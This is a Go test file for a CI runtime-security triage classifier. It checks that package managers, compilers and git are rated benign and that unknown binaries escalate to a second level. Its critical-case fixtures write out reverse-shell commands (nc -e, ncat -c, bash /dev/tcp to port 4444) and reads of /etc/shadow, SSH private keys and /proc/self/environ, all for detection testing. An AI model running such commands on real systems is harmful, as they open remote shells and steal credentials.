package triage

import (
	"log/slog"
	"net"
	"os"
	"testing"

	"github.com/IgorEulalio/philip/agent/sensor"
	"github.com/IgorEulalio/philip/backend/detection"
)

func newTestLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
}

func TestL1Classifier_Classify_NoDeviations(t *testing.T) {
	l1 := NewL1Classifier(newTestLogger())

	result := l1.Classify(TriageRequest{
		Deviations: nil,
		Repository: "owner/repo",
	})

	if result == nil {
		t.Fatal("expected non-nil result for empty deviations")
	}
	if result.Verdict != VerdictBenign {
		t.Errorf("verdict = %s, want benign", result.Verdict)
	}
	if result.Confidence != 1.0 {
		t.Errorf("confidence = %.2f, want 1.0", result.Confidence)
	}
}

func TestL1Classifier_Classify_BenignPatterns(t *testing.T) {
	l1 := NewL1Classifier(newTestLogger())

	tests := []struct {
		name       string
		deviations []detection.ScoredDeviation
		wantVerdict Verdict
	}{
		{
			name: "known package manager npm",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/bin/npm"},
					Score:         0.7,
				},
			},
			wantVerdict: VerdictBenign,
		},
		{
			name: "known package manager pip",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/bin/pip3"},
					Score:         0.7,
				},
			},
			wantVerdict: VerdictBenign,
		},
		{
			name: "known package manager cargo",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/local/bin/cargo"},
					Score:         0.7,
				},
			},
			wantVerdict: VerdictBenign,
		},
		{
			name: "known build tool gcc",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/bin/gcc"},
					Score:         0.7,
				},
			},
			wantVerdict: VerdictBenign,
		},
		{
			name: "git operations always benign",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/bin/git"},
					Score:         0.7,
				},
			},
			wantVerdict: VerdictBenign,
		},
		{
			name: "HTTPS connection low confidence benign",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewNetwork,
					Event:         sensor.Event{DestPort: 443},
					Score:         0.5,
				},
			},
			wantVerdict: VerdictBenign,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := l1.Classify(TriageRequest{
				Deviations: tc.deviations,
				Repository: "owner/repo",
			})

			if result == nil {
				t.Fatal("expected non-nil result for benign deviation")
			}
			if result.Verdict != tc.wantVerdict {
				t.Errorf("verdict = %s, want %s", result.Verdict, tc.wantVerdict)
			}
		})
	}
}

func TestL1Classifier_Classify_CriticalPatterns(t *testing.T) {
	l1 := NewL1Classifier(newTestLogger())

	tests := []struct {
		name       string
		deviations []detection.ScoredDeviation
		wantVerdict Verdict
	}{
		{
			name: "reverse shell nc -e",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event: sensor.Event{
						Binary: "/usr/bin/nc",
						Args:   []string{"-e", "/bin/bash", "198.51.100.1", "4444"},
					},
					Score: 1.0,
				},
			},
			wantVerdict: VerdictCritical,
		},
		{
			name: "reverse shell ncat -c",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event: sensor.Event{
						Binary: "/usr/bin/ncat",
						Args:   []string{"-c", "/bin/sh", "198.51.100.1", "4444"},
					},
					Score: 1.0,
				},
			},
			wantVerdict: VerdictCritical,
		},
		{
			name: "bash reverse shell /dev/tcp",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event: sensor.Event{
						Binary: "/bin/bash",
						Args:   []string{"-i", ">&", "/dev/tcp/198.51.100.1/4444", "0>&1"},
					},
					Score: 1.0,
				},
			},
			wantVerdict: VerdictCritical,
		},
		{
			name: "credential file access /etc/shadow",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationSensitivePath,
					Event: sensor.Event{
						Binary:   "/usr/bin/cat",
						FilePath: "/etc/shadow",
					},
					Score: 0.9,
				},
			},
			wantVerdict: VerdictCritical,
		},
		{
			name: "SSH key access",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationSensitivePath,
					Event: sensor.Event{
						Binary:   "/usr/bin/cat",
						FilePath: "/home/runner/.ssh/id_rsa",
					},
					Score: 0.9,
				},
			},
			wantVerdict: VerdictCritical,
		},
		{
			name: "proc environ dump",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationSensitivePath,
					Event: sensor.Event{
						Binary:   "/usr/bin/cat",
						FilePath: "/proc/self/environ",
					},
					Score: 0.85,
				},
			},
			wantVerdict: VerdictCritical,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := l1.Classify(TriageRequest{
				Deviations: tc.deviations,
				Repository: "owner/repo",
			})

			if result == nil {
				t.Fatal("expected non-nil result for critical deviation")
			}
			if result.Verdict != tc.wantVerdict {
				t.Errorf("verdict = %s, want %s", result.Verdict, tc.wantVerdict)
			}
		})
	}
}

func TestL1Classifier_Classify_EscalatesToL2(t *testing.T) {
	l1 := NewL1Classifier(newTestLogger())

	tests := []struct {
		name       string
		deviations []detection.ScoredDeviation
	}{
		{
			name: "unknown binary not in any rule",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/local/bin/suspicious-tool"},
					Score:         0.7,
				},
			},
		},
		{
			name: "new network connection on non-standard port",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewNetwork,
					Event: sensor.Event{
						Binary:   "/usr/bin/curl",
						DestIP:   net.ParseIP("198.51.100.1"),
						DestPort: 4444,
					},
					Score: 1.0,
				},
			},
		},
		{
			name: "mix of benign and unclassified",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/usr/bin/git"},
					Score:         0.3,
				},
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/tmp/payload"},
					Score:         0.9,
				},
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := l1.Classify(TriageRequest{
				Deviations: tc.deviations,
				Repository: "owner/repo",
			})

			if result != nil {
				t.Errorf("expected nil (escalate to L2), got verdict=%s", result.Verdict)
			}
		})
	}
}

func TestL1Classifier_Classify_MixedBenignAndCritical(t *testing.T) {
	l1 := NewL1Classifier(newTestLogger())

	// A mix where one is benign (npm) and one is critical (reverse shell)
	result := l1.Classify(TriageRequest{
		Deviations: []detection.ScoredDeviation{
			{
				DeviationType: detection.DeviationNewProcess,
				Event:         sensor.Event{Binary: "/usr/bin/npm"},
				Score:         0.3,
			},
			{
				DeviationType: detection.DeviationNewProcess,
				Event: sensor.Event{
					Binary: "/usr/bin/nc",
					Args:   []string{"-e", "/bin/bash", "10.0.0.1", "4444"},
				},
				Score: 1.0,
			},
		},
		Repository: "owner/repo",
	})

	if result == nil {
		t.Fatal("expected non-nil result for critical pattern")
	}
	if result.Verdict != VerdictCritical {
		t.Errorf("verdict = %s, want critical", result.Verdict)
	}
}
